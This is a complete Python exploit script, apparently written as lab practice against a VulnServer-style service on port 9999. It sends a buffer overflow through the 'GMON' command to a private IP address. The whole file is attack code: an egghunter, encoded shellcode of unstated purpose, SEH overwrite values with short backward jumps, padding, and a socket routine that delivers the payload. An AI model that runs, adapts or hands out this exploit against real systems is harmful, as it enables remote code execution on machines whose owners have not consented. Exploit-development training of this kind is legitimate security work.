#!/usr/bin/python

import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

# Payload iterations
# 1 - find SEH overwrite
# 2 - Control what is put in the SEH
# 3 - Fill SEH with a pop pop ret
# 4 - Jump back to the location of our "A" (0x41)
# 5 - Store egghunter here

egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

shellcode =  b""
shellcode += b"\x89\xe2\xdb\xcb\xd9\x72\xf4\x5b\x53\x59\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43"
shellcode += b"\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50"
shellcode += b"\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38"
shellcode += b"\x41\x42\x75\x4a\x49\x39\x6c\x49\x78\x6d\x52"
shellcode += b"\x75\x50\x37\x70\x35\x50\x55\x30\x6b\x39\x6d"
shellcode += b"\x35\x56\x51\x6f\x30\x45\x34\x4c\x4b\x62\x70"
shellcode += b"\x66\x50\x6c\x4b\x63\x62\x46\x6c\x4c\x4b\x63"
shellcode += b"\x62\x55\x44\x4e\x6b\x71\x62\x37\x58\x64\x4f"
shellcode += b"\x4f\x47\x62\x6a\x45\x76\x74\x71\x39\x6f\x4e"
shellcode += b"\x4c\x45\x6c\x53\x51\x61\x6c\x36\x62\x36\x4c"
shellcode += b"\x57\x50\x4b\x71\x38\x4f\x36\x6d\x46\x61\x58"
shellcode += b"\x47\x39\x72\x4c\x32\x42\x72\x70\x57\x6c\x4b"
shellcode += b"\x56\x32\x66\x70\x6c\x4b\x33\x7a\x77\x4c\x6c"
shellcode += b"\x4b\x42\x6c\x36\x71\x51\x68\x4d\x33\x53\x78"
shellcode += b"\x63\x31\x48\x51\x63\x61\x6e\x6b\x31\x49\x55"
shellcode += b"\x70\x77\x71\x69\x43\x4e\x6b\x63\x79\x44\x58"
shellcode += b"\x4a\x43\x34\x7a\x37\x39\x6e\x6b\x37\x44\x4e"
shellcode += b"\x6b\x55\x51\x6a\x76\x30\x31\x59\x6f\x6c\x6c"
shellcode += b"\x6a\x61\x68\x4f\x74\x4d\x66\x61\x78\x47\x56"
shellcode += b"\x58\x49\x70\x54\x35\x79\x66\x56\x63\x43\x4d"
shellcode += b"\x4a\x58\x67\x4b\x43\x4d\x57\x54\x63\x45\x4d"
shellcode += b"\x34\x56\x38\x4c\x4b\x30\x58\x75\x74\x47\x71"
shellcode += b"\x58\x53\x73\x56\x4e\x6b\x44\x4c\x50\x4b\x4c"
shellcode += b"\x4b\x43\x68\x45\x4c\x75\x51\x4e\x33\x4c\x4b"
shellcode += b"\x37\x74\x4c\x4b\x33\x31\x5a\x70\x4d\x59\x61"
shellcode += b"\x54\x74\x64\x71\x34\x73\x6b\x51\x4b\x55\x31"
shellcode += b"\x33\x69\x61\x4a\x50\x51\x69\x6f\x49\x70\x31"
shellcode += b"\x4f\x31\x4f\x32\x7a\x6c\x4b\x47\x62\x68\x6b"
shellcode += b"\x6e\x6d\x61\x4d\x31\x78\x36\x53\x74\x72\x55"
shellcode += b"\x50\x75\x50\x62\x48\x54\x37\x33\x43\x36\x52"
shellcode += b"\x43\x6f\x50\x54\x52\x48\x32\x6c\x64\x37\x35"
shellcode += b"\x76\x63\x37\x4d\x59\x79\x78\x39\x6f\x7a\x70"
shellcode += b"\x4f\x48\x6a\x30\x43\x31\x67\x70\x67\x70\x67"
shellcode += b"\x59\x39\x54\x73\x64\x66\x30\x50\x68\x36\x49"
shellcode += b"\x4f\x70\x70\x6b\x63\x30\x69\x6f\x68\x55\x31"
shellcode += b"\x7a\x76\x6a\x43\x58\x49\x50\x59\x38\x42\x5a"
shellcode += b"\x6c\x70\x32\x48\x73\x32\x47\x70\x53\x31\x6f"
shellcode += b"\x4b\x6b\x39\x7a\x46\x50\x50\x50\x50\x36\x30"
shellcode += b"\x56\x30\x57\x30\x52\x70\x33\x70\x72\x70\x51"
shellcode += b"\x78\x4b\x5a\x54\x4f\x4b\x6f\x49\x70\x59\x6f"
shellcode += b"\x4a\x75\x6a\x37\x61\x7a\x66\x70\x52\x76\x42"
shellcode += b"\x77\x70\x68\x6a\x39\x4c\x65\x34\x34\x75\x31"
shellcode += b"\x79\x6f\x4a\x75\x6b\x35\x6f\x30\x71\x64\x75"
shellcode += b"\x5a\x6b\x4f\x62\x6e\x55\x58\x71\x65\x6a\x4c"
shellcode += b"\x38\x68\x62\x47\x37\x70\x37\x70\x37\x70\x42"
shellcode += b"\x4a\x65\x50\x42\x4a\x63\x34\x30\x56\x63\x67"
shellcode += b"\x72\x48\x76\x62\x6a\x79\x4b\x78\x63\x6f\x4b"
shellcode += b"\x4f\x59\x45\x4c\x43\x79\x68\x53\x30\x61\x6e"
shellcode += b"\x36\x56\x6c\x4b\x50\x36\x70\x6a\x37\x30\x51"
shellcode += b"\x78\x37\x70\x44\x50\x77\x70\x77\x70\x73\x66"
shellcode += b"\x43\x5a\x47\x70\x73\x58\x70\x58\x49\x34\x42"
shellcode += b"\x73\x7a\x45\x49\x6f\x4a\x75\x4f\x63\x30\x53"
shellcode += b"\x71\x7a\x47\x70\x51\x46\x32\x73\x30\x57\x35"
shellcode += b"\x38\x44\x42\x6e\x39\x6b\x78\x73\x6f\x6b\x4f"
shellcode += b"\x6b\x65\x4c\x43\x69\x68\x67\x70\x61\x6d\x66"
shellcode += b"\x48\x73\x68\x72\x48\x73\x30\x51\x50\x45\x50"
shellcode += b"\x33\x30\x31\x7a\x35\x50\x32\x70\x30\x68\x54"
shellcode += b"\x4b\x54\x6f\x44\x4f\x56\x50\x79\x6f\x5a\x75"
shellcode += b"\x30\x57\x30\x68\x52\x55\x72\x4e\x52\x6d\x61"
shellcode += b"\x71\x39\x6f\x58\x55\x51\x4e\x51\x4e\x79\x6f"
shellcode += b"\x66\x6c\x64\x64\x66\x6f\x4b\x35\x54\x30\x79"
shellcode += b"\x6f\x39\x6f\x39\x6f\x39\x79\x4f\x6b\x69\x6f"
shellcode += b"\x59\x6f\x49\x6f\x57\x71\x68\x43\x75\x79\x6a"
shellcode += b"\x66\x64\x35\x39\x51\x58\x43\x41\x41"

#seh  = "\xb3\x11\x50\x62"
#seh  = "\xef\x11\x50\x62"
seh  = "\xb4\x10\x50\x62"
# jmp back 40
#nseh = "\xeb\xd8\x90\x90"
# jmp back 50
nseh = "\xeb\xce\x90\x90"
egg  = "w00tw00t"

# 8
payload =  egg
# 32
payload += shellcode
payload += "A" * (3467 - len(payload))
payload += egghunter
payload += "A" * (3515 - len(payload))
payload += nseh
payload += seh
payload += "D" * (5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.122.138", 9999))

s.send(command+payload)
s.recv(1024)
s.close()
